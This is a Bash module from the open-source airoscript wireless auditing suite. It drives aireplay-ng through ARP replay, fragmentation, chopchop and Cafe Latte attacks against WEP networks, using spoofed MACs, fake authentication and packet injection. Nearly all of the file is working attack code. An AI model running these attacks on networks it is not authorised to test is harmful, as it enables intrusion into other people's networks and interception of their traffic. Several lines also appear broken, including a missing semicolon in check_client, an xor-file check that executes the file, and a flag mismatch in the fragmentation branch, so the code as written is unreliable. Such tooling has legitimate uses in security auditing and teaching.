# Wep attack functions for airoscript
# Copyright (C) 2011 David Francos Cuartero
#        This program is free software; you can redistribute it and/or
#        modify it under the terms of the GNU General Public License
#        as published by the Free Software Foundation; either version 2
#        of the License, or (at your option) any later version.

#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#        GNU General Public License for more details.

#        You should have received a copy of the GNU General Public License
#        along with this program; if not, write to the Free Software
#        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

# Warning! at least generic, internal and interface must be loaded before this one!

check_function fakeauth3 || source $path/attacks/auth # It depends on auth module ;)
check_function injectmenu || source $path/attacks/injection # It depends on injection module ;)

check_client(){
	[[ $Client_MAC ]] && { directed=1; return 0 }
	select_target
}

check_dump_xor(){
    $DUMP_PATH/dump*xor && {
        return 0;
    } || {
        $clear; error "You need to get a XOR packet. You can do it for example with a frag attack or a chopchop attack"; return 20
    }

}

wep_attacks_menu(){
	help_fifo "${mark}${red}Wep attacks${end}\n"\
		"You're seeing this menu because the network you selected has WEP encryption\n"\
		""
    while true; do $clear  
	    mkmenu "Attacks using a client"\
		    "ARP replay => Automatic"\
            "ARP replay => Interactive"\
            "Fragmentation attack"\
            "Chopchop attack"\
            "Cafe latte"\
            "Return to main menu"

            case $choice in
                1) check_client && wep_attacks arpreplay_auto; break ;;
                2) check_client && wep_attacks arpreplay_interactive; break ;;
                3) check_client && wep_attacks fragmentation -7; break ;;  
                4) check_client && wep_attacks chopchopclient; break ;;
                5) check_client && wep_attacks caffelate; break ;;
                6) $clear; break ;;
                *) echo -e "`gettext \"Unknown response. Try again\"`" ;;
            esac
    done
}

wep_attacks(){
    attack=$1; shift;
    wep_attacks_$attack $@
    $clear;
}

base_wep_attack(){
    $clear
	hardclean replay_dec-*.xor
    capture &
}

wep_attacks_caffelate(){
    capture & 
	execute  "Cafe Latte Attack on: $Host_SSID "\
	   	$AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x \
		$INJECTRATE -D $iwifi & 
	fakeauth3 
}

wep_attacks_arpreplay_auto(){
	if [ "$INTERACTIVE" == "1" ]; then
		read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
		if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
		read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT
		if [ "$FT" = "" ]; then FT="f"; fi
	else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
	capture &

	wait_for_execute=1	
	execute "Injection in Host: $Host_MAC Client $Client_MAC"\
		$AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC\
		 -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE
	wait_for_execute=0

	check_dump_xor && { 
		wep_attacks pskarp 
	} || {
		 echo -e "Something failed, XOR not generated, did the PRGA capture failed?.\nPress any key to continue" 
	};

}

wep_attacks_arpreplay_interactive(){
    if [ "$INTERACTIVE" == 1 ]; then
        read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
        read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
        if [ "$FT" = "" ]; then FT="0841"; fi
    else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
    capture & execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
}

wep_attacks_fragmentation(){
    rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
    killall -9 airodump-ng aireplay-ng 

    if [ $1 ==  "NC" ]; then    
        execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h\
            $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi &
			capture &
			choose_fake &
			injectmenu frag
    else
        execute "Fragmentation attack" $AIREPLAY -7 -b $Host_MAC -h $Client_MAC\
            -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture &  injectmenu frag
    fi
}

wep_attacks_chopchop(){
	base_wep_attack;
	fakeauth3 &
    execute "Chopchoping: $Host_MAC"\
		$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & 
	injectmenu chopchop
}

wep_attacks_chopchopclient(){
    $clear
	hardclean replay_dec-*.xor
    capture &
	execute "ChopChoping: $Host_SSID"\
		$AIREPLAY --chopchop -h $Client_MAC $iwifi &
	injectmenu chopchop
}
